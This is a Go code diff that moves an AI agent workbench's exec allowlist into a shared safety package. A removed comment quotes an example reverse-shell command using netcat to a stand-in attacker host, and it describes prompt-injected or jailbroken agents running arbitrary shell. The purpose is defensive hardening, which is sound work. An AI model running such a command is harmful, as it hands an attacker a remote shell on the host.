@@ -4,59 +4,25 @@ import (
 	"fmt"
 	"path/filepath"
 	"strings"
+
+	"github.com/znasllc-io/memql/component/safety"
 )
 
-// allowedBinaries enumerates the commands an agent may invoke
-// through the workbench `exec` action. The agent's tool-loop is the
-// trust boundary; a compromised agent (prompt injection, jailbroken
-// base model) can run arbitrary shell against the per-Plan
-// workspace, so the per-call rlimits + 60-second timeout + 1 MiB
-// output cap have to do all the bounding work alone. This allowlist
-// is defense-in-depth on top: agents that genuinely need
-// `/usr/bin/curl` get it; agents that try `/bin/nc -e /bin/sh
-// attacker.example.com 4444` get rejected at the executor before
-// /bin/sh ever sees the string.
+// allowedBinaries is the workbench's exec allowlist. The DATA lives
+// in `component/safety.WorkbenchExecAllowlist` (memql#228) so the
+// rule-engine workbench-allowlist rule and this legacy enforcement
+// helper agree by construction; when memql#229 wires the safety gate
+// into the workbench dispatch, the rule replaces the helper and this
+// alias can go away.
 //
-// The set is intentionally narrow. Adding a new binary is a
-// memql#110-tracked follow-up -- start with "do agents need
-// $binary for the task?" not "would it be convenient." Anything
-// that can spawn arbitrary subprocesses (`xargs sh`, `sudo`, `env
-// COMMAND...`) is excluded; the allowlist's value is in its
-// boundary.
+// The set is intentionally narrow. Adding a binary is a deliberate
+// security decision -- "do agents need it for the task?" not "would
+// it be convenient." Anything that can spawn arbitrary subprocesses
+// (`sudo`, `xargs sh`, `env COMMAND`) is excluded; the allowlist's
+// value is in its boundary.
 //
 // Closes memql#110 (Option A: per-command allowlist).
-var allowedBinaries = map[string]struct{}{
-	// File + path inspection
-	"ls": {}, "cat": {}, "head": {}, "tail": {}, "less": {}, "more": {},
-	"find": {}, "stat": {}, "file": {}, "wc": {}, "pwd": {}, "readlink": {},
-	"basename": {}, "dirname": {}, "tree": {}, "which": {},
-	// File mutation (workspace is per-Plan, contained)
-	"cp": {}, "mv": {}, "rm": {}, "mkdir": {}, "chmod": {}, "touch": {},
-	"ln": {},
-	// Text processing
-	"grep": {}, "awk": {}, "sed": {}, "sort": {}, "uniq": {}, "diff": {},
-	"cut": {}, "tr": {}, "tee": {}, "xargs": {}, "echo": {}, "printf": {},
-	"yes": {}, "test": {}, "true": {}, "false": {}, "env": {}, "date": {},
-	// Archives + compression
-	"tar": {}, "gzip": {}, "gunzip": {}, "zip": {}, "unzip": {}, "bzip2": {},
-	"bunzip2": {}, "xz": {}, "unxz": {},
-	// Hashing
-	"md5sum": {}, "sha256sum": {}, "sha1sum": {}, "shasum": {},
-	// Networking (read-only fetch)
-	"curl": {}, "wget": {},
-	// Language toolchains
-	"python": {}, "python3": {}, "pip": {}, "pip3": {},
-	"node": {}, "npm": {}, "npx": {}, "yarn": {}, "pnpm": {},
-	"go": {}, "gofmt": {},
-	"ruby": {}, "gem": {}, "bundle": {},
-	"rustc": {}, "cargo": {},
-	"java": {}, "javac": {}, "mvn": {}, "gradle": {},
-	"perl": {},
-	// Source control
-	"git": {},
-	// Data tooling
-	"jq": {}, "yq": {},
-}
+var allowedBinaries = safety.WorkbenchExecAllowlist
 
 // segmentSeparators are the shell operators that introduce a new
 // command segment in a compound command. The allowlist walker
